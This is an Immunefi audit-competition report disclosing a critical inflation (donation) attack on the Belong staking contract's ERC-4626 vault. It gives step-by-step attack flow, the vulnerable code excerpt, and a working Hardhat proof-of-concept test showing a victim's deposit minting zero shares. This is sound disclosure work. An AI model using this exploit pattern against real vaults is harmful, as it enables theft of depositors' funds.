# 56896 sc critical staking contract is vulnerable to inflation attack making malicious 1st staker grief the following stakers

{% hint style="danger" %}
Severity: Critical — Griefing / inflation attack possible allowing a malicious first staker to cause subsequent stakers to lose funds.
{% endhint %}

## #56896 \[SC-Critical] staking contract is vulnerable to inflation attack making malicious 1st staker Grief the following stakers

* Submitted on Oct 21st 2025 at 15:54:34 UTC by @rzizah for [Audit Comp | Belong](https://immunefi.com/audit-competition/audit-comp-belong)
* Report ID: #56896
* Report Type: Smart Contract
* Report severity: Critical
* Target: <https://github.com/belongnet/checkin-contracts/blob/main/contracts/v2/periphery/Staking.sol>
* Impacts: Griefing (no profit motive required — attacker can harm other users or protocol)

### Description

#### Brief / Intro

The staking contract uses the standard ERC-4626 vault implementation and relies on the default `_decimalsOffset` value. This enables an attack where the first staker can grief later stakers, causing them to receive zero (or fewer) shares for their deposits and suffer loss of funds.

### Vulnerability Details

The contract uses a standard ERC-4626 vault which normally prevents many inflation attacks. However, because the default `_decimalsOffset` is used, the vault becomes vulnerable to a grieving / inflation-style attack where a malicious first staker manipulates the asset-to-share ratio to harm subsequent stakers.

The attack flow is described below.

{% stepper %}
{% step %}

### Setup: attacker becomes first depositor

* Attacker back-runs the pool creation transaction (or otherwise ensures they are the first depositor).
* Attacker deposits a minimal amount to receive 1 share: deposit(1). Now totalAssets() == 1 and totalSupply() == 1.
  {% endstep %}

{% step %}

### Victim attempts to deposit

* A victim attempts to deposit a larger amount (e.g., 50e18).
  {% endstep %}

{% step %}

### Attacker inflates asset balance

* Attacker front-runs the victim's deposit and directly transfers a large amount of assets into the vault (e.g., asset.transfer(100e18) to the vault).
* This artificially inflates totalAssets() while totalSupply() remains low (1), increasing the asset-per-share price.
  {% endstep %}

{% step %}

### Victim's deposit mints zero shares

* The victim's deposit executes after the direct transfer inflation.
* Due to the inflated asset-per-share ratio, the victim receives zero (or significantly fewer) shares for their deposit.
  {% endstep %}

{% step %}

### Attacker redeems inflated value

* After any lock/unlock period, the attacker redeems their minimal share(s) and receives a large portion of the assets — these assets include amounts the attacker used to inflate the vault and the victim’s deposit, effectively causing the victim to lose funds.
  {% endstep %}

{% step %}

### Repetition / chaining

* The attacker can repeat the same technique for subsequent stakers by directing transfers to the vault right before their deposits, causing partial or total loss for innocent stakers.
  {% endstep %}
  {% endstepper %}

### Impact Details

Total or partial loss of funds for honest stakers; attacker can grief other stakers without needing a profit motive (though profit can be extracted as described).

### References

* Vulnerable code location: <https://github.com/belongnet/checkin-contracts/blob/6b78ead6186c49cfec2787522460ddd516579a6b/contracts/v2/periphery/Staking.sol#L242-L246>

Relevant excerpt:

{% code title="Staking.sol (excerpt)" %}

```solidity
File: Staking.sol
242:     function _deposit(address by, address to, uint256 assets, uint256 shares) internal override {
243:         super._deposit(by, to, assets, shares);
244:         // lock freshly minted shares
245:         stakes[to].push(Stake({shares: shares, timestamp: block.timestamp}));
246:     }
```

{% endcode %}

### Proof of Concept (test)

Add the following test to `staking.test.ts` under `describe('Staking features')`. Run on a local hardhat network with prefunded accounts:

yarn hardhat test --network hardhat --grep "is vulnerable to inflation attack" ./test/v2/platform/staking.test.ts

The test shows that an innocent user (user2) receives 0 shares and loses deposited funds after the attacker inflates the vault.

{% code title="staking.test.ts (PoC)" %}

```typescript
describe('Staking features', () => {
  it('is vulnerable to inflation attack', async () => {
    const { staking, long, admin, user1, user2 } = await loadFixture(fixture);

    // Make amounts smaller but keep ratio high
    const minDeposit = ethers.utils.parseUnits("1", "wei");
    const largeAmount = ethers.utils.parseEther('100');
    const user2DepositAmount = ethers.utils.parseEther('50');

    // Give tokens to users
    await long.connect(admin).transfer(user1.address, largeAmount.add(minDeposit));
    await long.connect(admin).transfer(user2.address, user2DepositAmount);

    // User1 deposits minimum amount (1 wei) 
    await long.connect(user1).approve(staking.address, minDeposit);
    await staking.connect(user1).deposit(minDeposit, user1.address);
    
    // User1 directly transfers large amount to artificially inflate share price
    await long.connect(user1).transfer(staking.address, largeAmount);

    // Log share price before user2 deposit
    const totalSupply = await staking.totalSupply();
    const totalAssets = await staking.totalAssets();
    console.log("Share price after inflation:", totalAssets.toString(), "wei per", totalSupply.toString(), "shares");

    // User2 tries to deposit
    await long.connect(user2).approve(staking.address, user2DepositAmount);
    await staking.connect(user2).deposit(user2DepositAmount, user2.address);
    
    // Check shares received by user2
    const user2Shares = await staking.balanceOf(user2.address);
    console.log("User2 shares received:", user2Shares.toString());
    console.log("User2 deposit amount:", user2DepositAmount.toString());
    expect(user2Shares).to.be.lt(user2DepositAmount);
    
    // Enable withdrawals
    await staking.connect(admin).setMinStakePeriod(1);
    
    // User1 withdraws and gets most of the funds
    const user1Shares = await staking.balanceOf(user1.address);
    await staking.connect(user1).redeem(user1Shares, user1.address, user1.address);
    
    const user1FinalBalance = await long.balanceOf(user1.address);
    
    // User2 withdraws and gets nothing
    await staking.connect(user2).redeem(user2Shares, user2.address, user2.address);
    const user2FinalBalance = await long.balanceOf(user2.address);

    // showing amounts lost for the user2
    console.log("user1finalbalance: ", user1FinalBalance.toString());
    console.log("user2finalbalance: ", user2FinalBalance.toString());
    // Show the theft amount
    const LostAmount = user2DepositAmount.sub(user2FinalBalance);
    console.log("Amount lost from user2:", ethers.utils.formatEther(LostAmount), "LONG tokens");
  });
});
```

{% endcode %}
